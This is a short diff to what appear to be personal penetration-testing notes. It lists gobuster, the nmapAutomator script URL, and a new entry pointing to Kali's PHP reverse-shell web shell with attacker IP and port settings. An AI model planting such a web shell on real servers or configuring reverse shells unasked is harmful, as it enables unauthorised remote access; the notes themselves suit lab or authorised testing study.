@@ -22,3 +22,7 @@ apt-get install gobuster
 https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
 run
 
+WEBSHELL SITE PHP
+Kali /usr/share/webshells/php-reverse-shell.php
+$ip = '192.168.0.27';  // CHANGE THIS
+$port = 4444;   // CHANGE THIS
